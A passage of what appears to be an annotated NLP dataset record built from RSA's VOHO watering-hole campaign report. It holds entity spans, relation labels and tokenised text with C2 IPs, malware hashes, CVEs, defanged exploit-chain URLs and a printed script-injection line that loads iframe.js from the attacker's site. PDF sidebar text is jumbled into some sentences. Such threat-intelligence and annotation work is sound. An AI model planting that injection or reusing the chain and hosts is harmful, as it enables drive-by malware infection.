"sent_id": 57, "type": "Exploit"}], [{"name": "CVE-2007-4848", "pos": [32, 35], "sent_id": 57, "type": "Vulnerability"}], [{"name": "Trend Micro", "pos": [43, 45], "sent_id": 57, "type": "Organization"}], [{"name": "McAfee", "pos": [46, 47], "sent_id": 57, "type": "Organization"}], [{"name": "Symantec", "pos": [48, 49], "sent_id": 57, "type": "Organization"}], [{"name": "if.htm", "pos": [28, 29], "sent_id": 58, "type": "Exploit"}], [{"name": "July of 2011", "pos": [14, 17], "sent_id": 61, "type": "Time"}], [{"name": "Mila Parkour", "pos": [7, 9], "sent_id": 62, "type": "Person"}], [{"name": "Asia", "pos": [22, 23], "sent_id": 62, "type": "Region"}], [{"name": "xKungfoo", "pos": [28, 29], "sent_id": 62, "type": "Exploit"}], [{"name": "xKungFoo", "pos": [12, 13], "sent_id": 65, "type": "Exploit"}], [{"name": "Windows XP", "pos": [18, 20], "sent_id": 68, "type": "Software"}], [{"name": "Windows 2003", "pos": [21, 23], "sent_id": 68, "type": "Software"}], [{"name": "Windows VistaWindows 7", "pos": [24, 27], "sent_id": 68, "type": "Software"}], [{"name": "Enblue.htm", "pos": [0, 1], "sent_id": 69, "type": "Exploit"}], [{"name": "CVE-2012-1889", "pos": [3, 6], "sent_id": 69, "type": "Vulnerability"}], [{"name": "gh0st RAT", "pos": [23, 25], "sent_id": 69, "type": "Malware"}], [{"name": "Book.cab", "pos": [0, 1], "sent_id": 73, "type": "Payload"}], [{"name": "Book.cab", "pos": [1, 2], "sent_id": 73, "type": "Payload"}], [{"name": "gh0st RAT", "pos": [23, 25], "sent_id": 73, "type": "Malware"}], [{"name": "vptray.exe", "pos": [28, 29], "sent_id": 73, "type": "Malware"}], [{"name": "e6b43 c299a9a1f5abd9be2b729e54577", "pos": [31, 33], "sent_id": 73, "type": "MD5"}], [{"name": "hxxp://www.xxxxxxxcurling.com/Docs/BW06/iframe.js", "pos": [14, 15], "sent_id": 76, "type": "Indicator"}], [{"name": "hxxp://www.xxxxxxxcurling.com/Docs/BW06/module.php", "pos": [16, 17], "sent_id": 76, "type": "Indicator"}], [{"name": "hxxp://www.xxxxxxxcurling.com/Docs/BW06/engine.js", "pos": [18, 19], "sent_id": 76, "type": "Indicator"}], [{"name": "hxxp://www.xxxxxxxcurling.com/Docs/BW06/if.htm", "pos": [0, 1], "sent_id": 77, "type": "Indicator"}], [{"name": "hxxp://www.xxxxxxxcurling.com/Docs/BW06/applet.jar", "pos": [2, 3], "sent_id": 77, "type": "Indicator"}], [{"name": "If.htm", "pos": [10, 11], "sent_id": 77, "type": "Exploit"}], [{"name": "applet.jar", "pos": [24, 25], "sent_id": 78, "type": "Malware"}], [{"name": "XOR 77", "pos": [10, 12], "sent_id": 79, "type": "Obfuscation"}], [{"name": "2fe340fe2574ae540bd98bd9af8ec67d", "pos": [25, 26], "sent_id": 79, "type": "MD5"}], [{"name": "Gh0st RAT", "pos": [1, 3], "sent_id": 105, "type": "TrojanHorse"}], [{"name": "Dalai Lama", "pos": [19, 21], "sent_id": 109, "type": "ExploitTargetObject"}], [{"name": "ZeuS", "pos": [11, 12], "sent_id": 114, "type": "Malware"}], [{"name": "VPTray.EXE", "pos": [6, 9], "sent_id": 121, "type": "Malware"}], [{"name": "e6b43c299a9a1f5abd9be2b729e54577", "pos": [0, 1], "sent_id": 122, "type": "MD5"}], [{"name": "UP.BAK", "pos": [7, 8], "sent_id": 145, "type": "Malware"}], [{"name": "VPTray.EXE", "pos": [4, 7], "sent_id": 154, "type": "Malware"}], [{"name": "134.255.242.47", "pos": [4, 5], "sent_id": 155, "type": "Address"}], [{"name": "acc583fc596d38626d37cbf6de8a01cb", "pos": [1, 2], "sent_id": 163, "type": "MD5"}], [{"name": "VPTray.EXE", "pos": [2, 5], "sent_id": 163, "type": "Malware"}], [{"name": "b894efe4173f90479fddff455daf6ff3", "pos": [5, 6], "sent_id": 163, "type": "MD5"}], [{"name": "VPTray.EXE", "pos": [9, 12], "sent_id": 181, "type": "Malware"}], [{"name": "usc-data.suroot.com", "pos": [17, 18], "sent_id": 181, "type": "Indicator"}], [{"name": "Svohost.EXE", "pos": [3, 6], "sent_id": 189, "type": "Malware"}], [{"name": "2fe340fe2574ae540bd98bd9af8ec67d", "pos": [0, 1], "sent_id": 190, "type": "MD5"}], [{"name": "SVOHOST.EXE", "pos": [17, 18], "sent_id": 195, "type": "Malware"}], [{"name": "HEX digits", "pos": [7, 9], "sent_id": 203, "type": "Obfuscation"}], [{"name": "58.64.155.59", "pos": [0, 1], "sent_id": 211, "type": "Address"}], [{"name": "SVOHOST.EXE", "pos": [3, 4], "sent_id": 212, "type": "Malware"}], [{"name": "VOHO", "pos": [71, 72], "sent_id": 215, "type": "Campaign"}], [{"name": "June 25, 2012", "pos": [6, 10], "sent_id": 219, "type": "Time"}], [{"name": "Internet Explorer", "pos": [11, 13], "sent_id": 220, "type": "Software"}], [{"name": "July 9, 2012", "pos": [15, 19], "sent_id": 220, "type": "Time"}], [{"name": "July 10th", "pos": [17, 19], "sent_id": 222, "type": "Time"}], [{"name": "Sun Java", "pos": [14, 16], "sent_id": 223, "type": "ExploitTargetObject"}], [{"name": "July 16, 2012", "pos": [20, 24], "sent_id": 223, "type": "Time"}], [{"name": "July 18, 2012", "pos": [15, 19], "sent_id": 224, "type": "Time"}], [{"name": "Wsdhealthy.com", "pos": [2, 3], "sent_id": 263, "type": "Indicator"}], [{"name": "03db29c71b0031af08081f5e2f7dcdf2", "pos": [0, 1], "sent_id": 265, "type": "MD5"}], [{"name": "644161889f0f60885b2a0eec12038b66", "pos": [0, 1], "sent_id": 266, "type": "MD5"}], [{"name": "58.64.143.245", "pos": [6, 7], "sent_id": 267, "type": "Address"}], [{"name": "usc-data.suroot.com", "pos": [14, 15], "sent_id": 268, "type": "Indicator"}], [{"name": "usa-mail.scieron.com", "pos": [15, 16], "sent_id": 268, "type": "Indicator"}], [{"name": "dll.freshdns.org", "pos": [16, 17], "sent_id": 268, "type": "Indicator"}], [{"name": "www.wsdhealthy.com/userfiles/file/Applet19.html", "pos": [48, 49], "sent_id": 268, "type": "Exploit"}], [{"name": "www.wsdhealthy.com/userfiles/file/Applet19.exe", "pos": [0, 1], "sent_id": 269, "type": "Exploit"}], [{"name": "www.wsdhealthy.com/userfiles/file/Applet.html", "pos": [1, 2], "sent_id": 269, "type": "Exploit"}], [{"name": "www.wsdhealthy.com/userfiles/file/Applet.jar", "pos": [2, 3], "sent_id": 269, "type": "Exploit"}], [{"name": "www.wsdhealthy.com/userfiles/file/Applet.exe", "pos": [0, 1], "sent_id": 270, "type": "Exploit"}], [{"name": "CVE\u20132011-3544", "pos": [30, 33], "sent_id": 271, "type": "Vulnerability"}], [{"name": "58.64.155.59", "pos": [0, 1], "sent_id": 275, "type": "Address"}], [{"name": "gh0st RAT", "pos": [2, 4], "sent_id": 275, "type": "Malware"}], [{"name": "58.64.155.57", "pos": [0, 1], "sent_id": 276, "type": "Address"}], [{"name": "58.64.143.245", "pos": [0, 1], "sent_id": 277, "type": "Address"}], [{"name": "wsdhealthy.com", "pos": [1, 2], "sent_id": 278, "type": "Indicator"}], [{"name": "*******curling.com", "pos": [11, 19], "sent_id": 278, "type": "Indicator"}], [{"name": "usc-data.suroot.com", "pos": [0, 1], "sent_id": 279, "type": "Indicator"}], [{"name": "gh0st RAT", "pos": [2, 4], "sent_id": 279, "type": "Malware"}], [{"name": "usa-mail.scieron.com", "pos": [0, 1], "sent_id": 280, "type": "Indicator"}], [{"name": "gh0st RAT", "pos": [2, 4], "sent_id": 280, "type": "Malware"}], [{"name": "dll.freshdns.org", "pos": [0, 1], "sent_id": 281, "type": "Indicator"}], [{"name": "gh0st RAT", "pos": [2, 4], "sent_id": 281, "type": "Malware"}], [{"name": "gh0st RAT", "pos": [2, 4], "sent_id": 283, "type": "Malware"}], [{"name": "03db29c71b0031af08081f5e2f7dcdf2", "pos": [4, 5], "sent_id": 286, "type": "MD5"}], [{"name": "644161889f0f60885b2a0eec12038b66", "pos": [0, 1], "sent_id": 287, "type": "MD5"}], [{"name": "e6b43c299a9a1f5abd9be2b729e54577", "pos": [0, 1], "sent_id": 288, "type": "MD5"}], [{"name": "2fe340fe2574ae540bd98bd9af8ec67d", "pos": [0, 1], "sent_id": 289, "type": "MD5"}], [{"name": "58.64.155.59", "pos": [6, 7], "sent_id": 289, "type": "Address"}], [{"name": "58.64.155.57", "pos": [6, 7], "sent_id": 289, "type": "Address"}], [{"name": "58.64.143.245", "pos": [6, 7], "sent_id": 289, "type": "Address"}], [{"name": "64.26.174.74", "pos": [6, 7], "sent_id": 289, "type": "Address"}], [{"name": "Gh0st RAT", "pos": [17, 19], "sent_id": 290, "type": "Malware"}], [{"name": "xKungFoo", "pos": [42, 43], "sent_id": 292, "type": "Exploit"}]], "labels": [{"r": "P32", "h": 4, "t": 6, "evidence": [14, 15]}, {"r": "P7", "h": 26, "t": 27, "evidence": [30, 31]}, {"r": "P7", "h": 26, "t": 28, "evidence": [30, 31]}, {"r": "P21", "h": 30, "t": 29, "evidence": [31]}, {"r": "P21", "h": 31, "t": 29, "evidence": [31]}, {"r": "P7", "h": 36, "t": 37, "evidence": [39]}, {"r": "P7", "h": 36, "t": 38, "evidence": [39]}, {"r": "P7", "h": 51, "t": 52, "evidence": [57]}, {"r": "P33", "h": 51, "t": 57, "evidence": [57, 61]}, {"r": "P7", "h": 65, "t": 66, "evidence": [69]}, {"r": "P21", "h": 72, "t": 71, "evidence": [73]}, {"r": "P21", "h": 81, "t": 79, "evidence": [78, 79]}, {"r": "P21", "h": 89, "t": 88, "evidence": [154, 155]}, {"r": "P21", "h": 94, "t": 93, "evidence": [181]}, {"r": "P21", "h": 96, "t": 95, "evidence": [189, 190]}, {"r": "P21", "h": 92, "t": 91, "evidence": [163]}, {"r": "P21", "h": 90, "t": 91, "evidence": [163]}, {"r": "P21", "h": 86, "t": 85, "evidence": [121, 122]}, {"r": "P21", "h": 99, "t": 100, "evidence": [211, 212]}, {"r": "P33", "h": 101, "t": 102, "evidence": [215, 219]}, {"r": "P33", "h": 101, "t": 104, "evidence": [215, 220]}, {"r": "P33", "h": 101, "t": 105, "evidence": [215, 222]}, {"r": "P33", "h": 101, "t": 107, "evidence": [215, 223]}, {"r": "P33", "h": 101, "t": 108, "evidence": [215, 224]}, {"r": "P21", "h": 122, "t": 123, "evidence": [275]}, {"r": "P21", "h": 124, "t": 123, "evidence": [275, 276]}, {"r": "P21", "h": 125, "t": 123, "evidence": [275, 277]}, {"r": "P21", "h": 126, "t": 129, "evidence": [278, 279]}, {"r": "P21", "h": 127, "t": 129, "evidence": [278, 279]}, {"r": "P21", "h": 128, "t": 129, "evidence": [279]}, {"r": "P21", "h": 130, "t": 131, "evidence": [280]}, {"r": "P21", "h": 132, "t": 133, "evidence": [281]}, {"r": "P21", "h": 135, "t": 134, "evidence": [283, 286]}, {"r": "P21", "h": 136, "t": 134, "evidence": [283, 287]}, {"r": "P21", "h": 137, "t": 134, "evidence": [283, 288]}, {"r": "P21", "h": 138, "t": 134, "evidence": [283, 289]}, {"r": "P21", "h": 139, "t": 143, "evidence": [289, 290]}, {"r": "P21", "h": 140, "t": 143, "evidence": [289, 290]}, {"r": "P21", "h": 141, "t": 143, "evidence": [289, 290]}, {"r": "P21", "h": 142, "t": 143, "evidence": [289, 290]}], "title": "201209RSAFirstWatchVOHO", "sents": [["THE", "VOHO", "CAMPAIGN", ":", "AN", "IN", "DEPTH", "ANALYSIS", "RSA", "FirstWatchSM", "Intelligence", "Report", "White", "Paper"], ["In", "July", "of", "2012", ",", "the", "RSA", "FirstWatchSM", "research", "and", "intelligence", "team", "identified", "an", "emerging", "malicious", "code", "and", "content", "campaign", "spreading", "at", "a", "rapid", "rate", "within", "very"], ["About", "RSA", "FirstWatchS", "M", "Team", "specific", "geographic", "theaters", "."], ["These", "clusters", "were", "confined", "to", "ten", "geographic", "areas", "RSA", "FirstWatchSM", "team", "is", "an", "elite", ",", "highly", "trained", "global", "threat", "research", "and", "intelligence", "team", "designed", "to", "operate", "in", "a", "number", "of", "disciplines", "to", "provide", "tactical", "and", "strategic", "intelligence", "on", "advanced", "threats", ",", "threat", "campaigns", "and", "threat", "actors", "."], ["The", "team", ",", "lead", "by", "Will", "Gragido", ",", "focuses", "on", "advanced", "threat", "research", "and", "intelligence", "which", "culminates", "in", "threat", "feeds", ",", "digests", ",", "profiles", "and", "ecosystem", "analysis", "designed", "to", "aid", "the", "RSA", "NetWitness", "\u00ae", "user", "community", "and", "the", "information", "security", "community", "at", "large", "in", "contending", "with", "these", "challenges", ".", "and", "involved", "thousands", "of", "hosts", "."], ["To", "the", "untrained", "eye", "it", "would", "appear", "the", "hosts", "Contributing", "Authors", "Alex", "Cox", ",", "Principal", "Researcher", ",", "RSA", "FirstWatch", "Team", "Chris", "Elisan", ","], ["Principal", "Malware"], ["Researcher", ",", "RSA", "FirstWatch", "Team"], ["Will", "Gragido", ",", "Sr", "."], ["Manager", ",", "RSA", "FirstWatch", "Team"], ["Chris", "Harrington", ",", "Consulting", "Security", "Engineer", ",", "EMC", "CIRC"], ["Jon", "McNeill", ",", "Principal", "Technologist", ",", "RSA", "FirstWatch", "Team", "involved", "in", "this", "campaign", "were", "compromised", "as", "the", "result", "of", "innocent", "web", "surfing", "using", "a", "common", "\u201c", "drive", "-", "by", "\u201d", "attack", "mechanism", "."], ["While", "at", "face", "value", "this", "is", "true", ",", "our", "investigation", "infers", "that", "the", "populations", "compromised", "were", "not", "chosen", "in", "an", "indiscriminate", "manner", ",", "but", "rather", "with", "great", "forethought", "."], ["Based", "on", "the", "RSA", "FirstWatch", "research", ",", "we", "believe", "these", "websites", "were", "likely", "chosen", "with", "exact", "precision", "and", "great", "consideration", ";", "selected", "from", "thousands", "upon", "thousands", "of", "websites", "due", "to", "familiarity", "and", "proximity", "to", "the", "targets", "of", "interest", "that", "the", "threat", "actors", "responsible", "for", "the", "campaign", "were", "truly", "interested", "in", "compromising", "."], ["The", "RSA", "-", "FirstWatch", "team", "\u2019s", "research", "led", "to", "the", "identification", "of", "this", "campaign", "and", "its", "name", ",", "\u2018", "VOHO", "\u2019", "."], ["From", "a", "tools", ",", "technique", "and", "procedure", "(", "TTP", ")", "perspective", ",", "the", "RSA", "FirstWatch", "team", "believes", "this", "campaign", "aligns", "with", "the", "Advanced", "Persistent", "Threat", "(", "APT", ")", "threat", "model", ",", "including", "communications", "emitting", "from", "compromised", "hosts", "to", "IP", "addresses", "confirmed", "as", "Command", "and", "Control", "(", "C2", ")", "servers", "(", "in", "this", "case", ",", "located", "in", "Hong", "Kong", ")", ";", "code", "re", "-", "use", "using", "exploit", "scripts", "and", "ultimately", ",", "a", "before", "-", "unseen", "variant", "of", "\u201c", "Gh0st", "RAT", "\u201d", "malware", "."], ["Additionally", ",", "targets", "appeared", "to", "be", "specifically", "chosen", "to", "compromise", "hosts", "involved", "in", "business", "and", "local", "governments", "in", "Washington", ",", "DC", "and", "Boston", ",", "Massachusetts", ",", "as", "well", "as", "organizations", "involved", "the", "development", "and", "promotion", "of", "democratic", "process", "in", "non", "-", "permissive", "regions", "."], ["As", "a", "whole", ",", "these", "specific", "TTPs", "have", "been", "observed", "in", "previous", "APT", "attack", "campaigns", ",", "most", "notably", ",", "Aurora", "i", "and", "Ghostnet", "ii", "."], ["Through", "our", "research", ",", "the", "RSA", "FirstWatch", "team", "identified", "what", "it", "believes", "to", "be", "the", "primary", "mechanism", "for", "tactical", "and", "strategic", "infection", "of", "victims", "affiliated", "with", "targets", "of", "opportunity", "."], ["While", "this", "attack", "methodology", "has", "been", "observed", "before", ",", "it", "has", "not", "been", "widely", "documented", "or", "disseminated", "."], ["As", "such", ",", "we", "have", "termed", "this", "technique", "\u2018", "Water", "Holing", "\u2019", "."], ["The", "architects", "of", "these", "campaigns", "survey", "and", "select", "the", "websites", "(", "known", "as", "pivot", "or", "redirector", "sites", ")", "leveraged", "in", "these", "attacks", "carefully", "."], ["Weighing", "their", "geographic", "relevance", ",", "proximity", "to", "their", "desired", "targets", "of", "opportunity", ",", "and", "likelihood", "of", "being", "traversed", "by", "potential", "victim", "-", "users", "associated", "with", "the", "attacker", "objective", ",", "the", "adversary", "carefully", "exploits", "vulnerable", "systems", "and", "inserts", "malicious", "scripts", "to", "deliver", "a", "Trojan", "payload", "via", "browser", "-", "based", "exploits", "to", "visitors", "to", "the", "website", "."], ["Throughout", "this", "paper", ",", "we", "will", "examine", "the", "evolution", "of", "this", "threat", "campaign", ",", "its", "ties", "to", "other", "comparable", "threat", "campaigns", "where", "variants", "of", "the", "malicious", "payload", "seen", "in", "this", "attack", "(", "gh0strat", ")", "have", "been", "identified", "and", "chronicled", ",", "epicenters", "of", "geographic", "activity", "associated", "with", "this", "campaign", ",", "industry", "/", "verticals", "targeted", "in", "this", "campaign", "and", "the", "construction", "of", "the", "attribution", "chain", "."], ["2", "Specifics"], ["Using", "the", "tactic", "of", "crafting", "a", "\u201c", "Watering", "Hole", "\u201d", ",", "the", "majority", "of", "the", "redirection", "activity", "occurred", "because", "of", "JavaScript", "elements", "on", "two", "specific", "websites", "."], ["\u2022", "hxxp://www.xxxxxxxxtrust.com", "\u2022", "hxxp://xxxxxxcountymd.gov", "Respectively", ",", "these", "two", "sites", "\u2013", "one", "a", "regional", "bank", "in", "Massachusetts", "and", "a", "local", "government", "serving", "the", "Washington", "DC", "suburbs", "."], ["We", "also", "saw", "an", "additional", "chain", "of", "websites", "with", "a", "geopolitical", "central", "theme", "redirecting", "to", "the", "exploit", "site", ":", "\u2022", "hxxp://ifxx.org", "\u2022", "hxxp://xxxxxxcenter.org", "\u2022", "hxxp://xxi.org", "\u2022", "hxxp://xxxxxxx.prio.no", "\u2022", "hxxp:/xxxxxxxxpolitics.com", "\u2022", "hxxp://www.rfxxx.org"], ["Additionally", ",", "sites", "serving", "the", "Defense", "Industrial", "Base", "and", "Educational", "community", "were", "also", "observed", "redirecting", "to", "the", "exploit", "site", ":", "\u2022", "hxxp://www.gftxxx.org", "\u2022", "hxxp://www.xxxxxxantennas.com"], ["When", "taken", "as", "a", "whole", ",", "this", "campaign", "appears", "to", "have", "targeted", ":", "\u2022", "Boston", ",", "Massachusetts", "area", "users", "\u2022", "Political", "Activists", "\u2022", "Users", "Washington", ",", "DC", "and", "its", "suburbs", "\u2022", "Defense", "Industrial", "Base", "\u2022", "Education", "Malicious", "Infrastructure", "Hosts", "visiting", "the", "aforementioned", "sites", "were", "redirected", "to", "a", "website", "of", "enthusiasts", "of", "a", "lesser", "known", "sport", "at", "the", "following", "domain", ":"], ["hxxp://xxxxxxxcurling.com"], ["This", "site", "attempted", "to", "exploit", "the", "following", "host", "vulnerabilities", ",", "in", "two", "different", "attack", "campaigns", ":", "\u2022", "Microsoft", "XML", "Core", "Services", "\u2013", "CVE-2012", "-", "1889", "\u2022", "Java", "Exploit", "\u2013", "CVE-2012", "-", "1723", "Once", "successfully", "exploited", ",", "the", "installed", "\u201c", "Gh0st", "RAT", "\u201d", "would", "beacon", "to", "one", "of", "two", "IP", "addresses", ":", "\u2022", "58.64.155.59", "\u2022", "58.64.155.57", "3", "Exploit", "Specifics", "Attack", "Methodology", "Overview"], ["hxxp://xxxxxxxcurling.com", "Compromise", "Files", "found", "on", "the", "sporting", "group", "website", "indicate", "that", "this", "server", "was", "likely", "compromised", "with", "a", "remote", "buffer", "overflow", "(", "CVE-2008", "-", "3869", "/", "CVE-2008", "-", "3870", ")", "against", "the", "server", "\u2019s", "sadmind", "daemon", "."], ["Additional", "files", "indicated", "the", "ability", "to", "establish", "a", "remote", "shell", "on", "demand", "."], ["It", "is", "unknown", "if", "this", "method", "was", "also", "used", "to", "compromise", "the", "\u201c", "watering", "hole", "\u201d", "sites", "."], ["In", "these", "cases", ",", "the", "following", "code", "snipped", "was", "added", "to", "publically", "accessible", "pages", "on", "the", "site", ",", "typically", ".js", "files", "are", "used", "to", "process", "a", "site", "\u2019s", "JavaScript", ":", "document.write('<script"], ["src=\"http://www.*******curling.com", "/", "Docs", "/", "BW06", "/", "iframe.js\"></script", ">", "'", ")", ";"], ["This", "is", "a", "simple", "redirection", "mechanism", "that", "will", "cause", "the", "browser", "to", "redirect", "and", "load", "content", "from", "the", "remote", "site", "."], ["Hits", "to", "\u201c", "iframe.js", "\u201d", "launch", "an", "enumeration", "and", "exploit", "chain", "that", "attempts", "to", "exploit", "two", "different", "vulnerabilities", ",", "Gh0st", "RAT", "is", "a", "multiple", "-", "purpose", "remote", "access", "tool", "that", "allows", "extensive", "remote", "control", "of", "compromised", "hosts", "."], ["While", "there", "is", "no", "known", "evidence", "linking", "this", "attack", "to", "previous", "attacks", ",", "gh0st", "has", "historically", "been", "used", "in", "politically", "motivated", "espionage", "by", "nation", "-", "state", "attackers", ",", "in", "a", "similar", "manner", "as", "seen", "in", "this", "campaign", "depending", "on", "the", "specific", "redirection", "path", ":", "\u2022", "Microsoft", "XML", "Core", "Services", "\u2013", "CVE-2012", "-", "1889", "\u2022", "Java", "Exploit", "\u2013", "CVE-2012", "-", "1723", "Phase", "1", "-", "Exploit", "Chain", "\u2013", "Microsoft", "XML", "Core", "Services"], ["From", "our", "research", ",", "this", "campaign", "occurred", "between", "June", "25th", ",", "2012", "and", "July", "18th", "2012", "in", "which", "attackers", "sought", "to", "exploit", "the", "CVE-2012", "-", "1889", "vulnerability", "that", "was", "zero", "-", "day", "and", "was", "being", "used", "in", "targeted", "attacks", "as", "noted", "in", "early", "June", "iii", "."], ["In", "this", "attack", ",", "a", "successful", "exploit", "on", "CVE-2012", "-", "1889", "followed", "the", "following", "path", ":"], ["[", "Watering", "Hole", "Sites", "]", "http://xxxxxxcountymd.gov"], ["(", "or", "other", "water", "hole", "site", ")", "\uf0e0", "http://www.xxxxxxxcurling.com/Results/cx/magma/iframe.js", "\uf0e0"], ["http://www.xxxxxxxcurling.com/Results/cx/magma/module.php", "\uf0e0"], ["http://www.xxxxxxxcurling.com/Results/cx/magma/engine.js", "\uf0e0"], ["http://www.xxxxxxxcurling.com/Results/cx/magma/if.htm"], ["\uf0e0"], ["http://www.xxxxxxxcurling.com/Results/cx/magma/enblue.htm"], ["\uf0e0", "http://www.xxxxxxxcurling.com/Results/cx/magma/book.cab", "4", "."], ["Figure", "1", ":"], ["iFrame.js"], ["Flow", "Iframe.js"], ["Iframe.js", "checks", "if", "the", "visiting", "machine", "is", "running", "a", "Windows", "operating", "system", "and", "Internet"], ["Explorer", "."], ["It", "also", "sets", "a", "cookie", "value", "(", "presumably", "to", "track", "individual", "visits", ")", "."], ["If", "the", "visiting", "machine", "is", "running", "a", "Windows", "operating", "system", "and", "Internet", "Explorer", ",", "it", "forward", "to", "module.php", "."], ["Module.php", "Module.php", "uses", "a", "simple", "redirection", "script", "to", "redirect", "the", "browser", "to", "Engine.js", "Engine.js", "Engine.js", "looks", "for", "processes", "related", "to", "the", "following", "antivirus", "engines", "using", "an", "older", "vulnerability", "in", "Internet", "Explorer", "(", "CVE-2007", "-", "4848", ")", "that", "allows", "local", "file", "enumeration", ":", "\u2022", "Trend", "Micro", "\u2022", "McAfee", "\u2022", "Symantec"], ["However", ",", "the", "results", "of", "this", "check", "do", "n\u2019t", "change", "the", "outcome", "of", "the", "script", "running", "in", "all", "cases", ";", "it", "simply", "results", "in", "the", "loading", "of", "\u201c", "if.htm", "\u201d", "."], ["We", "believe", "this", "to", "be", "a", "case", "of", "existing", "exploit", "script", "re", "-", "use", ",", "with", "slight", "changes", "to", "suit", "the", "attackers", "current", "purpose", "."], ["5"], ["This", "particular", "enumeration", "script", "was", "seen", "previously", "in", "APT", "-", "style", "attacks", "back", "in", "July", "of", "2011", ",", "as", "detailed", "here", "on", "the", "contagiodump", "blog", "iv", "."], ["Within", "the", "blog", ",", "noted", "industry", "researcher", "Mila", "Parkour", ",", "cited", "the", "presence", "and", "use", "of", "borrowed", "scripts", "having", "likely", "originated", "in", "Asia", ",", "specifically", "the", "so", "called", "xKungfoo", "script", "in", "attacks", "launched", "associated", "with", "numerous", "campaigns", "targeted", "at", "political", "dissidents", "."], ["v", "Additionally", ",", "Ms.", "Parkour", "has", "also", "noted", "and", "documented", "the", "presence", "of", "this", "weaponizable", "code", "in", "numerous", "locales", "on", "the", "Internet", "today", "."], ["vi", "vii"], ["In", "the", "following", "figures", "evidence", "of", "the", "presence", "and", "availability", "of", "the", "xKungFoo", "script", "(", "the", "script", "referenced", "by", "Mila", "Parkour", "and", "noted", "as", "being", "germane", "to", "the", "RSA", "FirstWatch", "investigation", ")", "along", "with", "endorsement", "by", "the", "author", "can", "be", "seen", ":"], ["Figure", "2", ":", "Website", "Where", "xKungFoo", "Script", "Originates", "Figure", "3", ":", "Example", "of", "xKungFoo", "Script", "Originates", "Figure", "4", ":", "Endorsement", "by"], ["Author", "Regarding", "xKungFoo", "6", "If.htm", "1", ")"], ["Checks", "if", "the", "visiting", "host", "\u2019s", "user", "agent", "reflects", "is", "one", "of", "the", "following", ":", "\u2022", "Unknown", "\u2022", "Windows", "XP", "\u2022", "Windows", "2003", "\u2022", "Windows", "VistaWindows", "7", "Checks", "if", "the", "visiting", "hosts", "language", "settings", "are", ":", "\u2022", "English", "\u2022", "Chinese", "\u2022", "French", "\u2022", "German", "\u2022", "Japanese", "\u2022", "Portuguese", "\u2022", "Korean", "\u2022", "Russian", "Enblue.htm"], ["Enblue.htm", "uses", "the", "CVE-2012", "-", "1889", "XML", "vulnerability", "to", "compromise", "the", "visiting", "browser", ",", "which", "results", "in", "a", "pull", "and", "installation", "of", "the", "gh0st", "RAT", "malware", "."], ["This", "script", "also", "appears", "to", "be", "code", "reuse", "of", "a", "script", "seen", "on", "pastebin", "as", "follows", ":"], ["http://pastebin.com/VfmuhEiq"], ["Interestingly", ",", "this", "code", "was", "also", "purportedly", "used", "in", "previous", "nation", "-", "state", "sponsored", "attacks", "on", "Gmail", "accounts", "viii", "."], ["Book.cab", "Book.cab", ",", "the", "final", "payload", ",", "is", "an", "obfuscated", "executable", "which", ",", "when", "de", "-", "obfuscated", "using", "XOR", "95", ",", "is", "the", "gh0st", "RAT", "sample", "named", "\u201c", "vptray.exe", "\u201d", "(", "e6b43", "c299a9a1f5abd9be2b729e54577", ")", "Phase", "II", "-", "Exploit", "Chain", "\u2013"], ["Sun", "Java"], ["Phase", "II", "of", "this", "campaign", ",", "using", "the", "same", "infrastructure", ",", "but", "with", "a", "different", "directory", "for", "the", "exploit", "chain", "files", "as", "follows", ":"], ["[", "Watering", "Hole", "Sites", "]", "hxxp://xxxxxcountymd.gov", "(", "or", "other", "water", "hole", "site", ")", "\uf0e0", "hxxp://www.xxxxxxxcurling.com/Docs/BW06/iframe.js", "\uf0e0", "hxxp://www.xxxxxxxcurling.com/Docs/BW06/module.php", "\uf0e0", "hxxp://www.xxxxxxxcurling.com/Docs/BW06/engine.js", "\uf0e0"], ["hxxp://www.xxxxxxxcurling.com/Docs/BW06/if.htm", "\uf0e0", "hxxp://www.xxxxxxxcurling.com/Docs/BW06/applet.jar", "7", "Figure", "5", ":", "Java", "Exploit", "Chain", "If.htm"], ["In", "this", "case", ",", "all", "of", "the", "scripts", "were", "identical", "up", "to", "\u201c", "if.htm", "\u201d", ",", "which", "instead", "contained", "a", "java", "call", "that", "loaded", "applet.jar", ",", "as", "well", "as", "a", "large", "blob", "of", "obfuscated", "code", "as", "a", "\u201c", "param", "\u201d", "element", "."], ["This", "large", "blob", "of", "code", "is", "a", "binary", "obfuscated", "with", "XOR", "77", ",", "which", "the", "java", "applet", "deobfuscates", "and", "runs", "as", "\u201c", "svohost.exe", "\u201d", "(", "2fe340fe2574ae540bd98bd9af8ec67d", ")", "."], ["Figure", "6", ":", "Java", "Applet", "Deobfuscates", "and", "Runs", "as", "\u201c", "svohost.exe", "\u201d", "8"], ["\u201c"], ["Watering", "Hole", "\u201d", "Specifics"], ["Strategically", ",", "the", "idea", "of", "using", "a", "target", "\u2019s", "interests", "and", "likely", "access", "points", "is", "not", "a", "new", "method", "of", "attack", "."], ["Undertaking", "it", "on", "such", "a", "large", "scale", ",", "however", ",", "is", "notable", "and", "unusual", "in", "the", "APT", "space", "."], ["In", "this", "campaign", ",", "five", "separate", "\u201c", "classes", "\u201d", "of", "sites", "that", "were", "compromised", "and", "trojanized", "to", "redirect", "to", "the", "exploit", "chains", "on", "the", "sporting", "group", "website", "."], ["They", "were", ":", "\u2022", "Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Boston", ",", "MA", "area", "\u2022", "Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "Political", "Activism", "\u2022", "Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Washington", ",", "DC", "and", "its", "suburbs", "areas", "\u2022", "Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Defense", "Industrial", "Base", "\u2022", "Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Education"], ["Additionally", ",", "there", "were", "a", "spattering", "of", "non", "-", "related", "sites", "that", "appeared", "to", "be", "simple", "redirectors", "to", "one", "of", "the", "above", "-", "categorized", "sites", "."], ["This", "sort", "of", "redirector", "is", "often", "used", "in", "spam", "campaigns", "to", "obfuscate", "the", "final", "location", "of", "the", "exploit", "server", "in", "an", "attempt", "to", "bypass", "email", "malware", "controls", "."], ["While", "we", "do", "n\u2019t", "have", "specific", "examples", "of", "related", "spam", "activity", ",", "this", "seems", "a", "likely", "such", "use", "of", "the", "additional", "sites", "."], ["One", "of", "the", "main", "sources", "of", "infection", "for", "these", "campaigns", "were", "sites", "that", "support", "the", "cause", "of", "democratic", "process", "in", "non", "-", "permissive", "environments", ",", "or", "the", "communication", "of", "information", "related", "to", "free", "speech", "."], 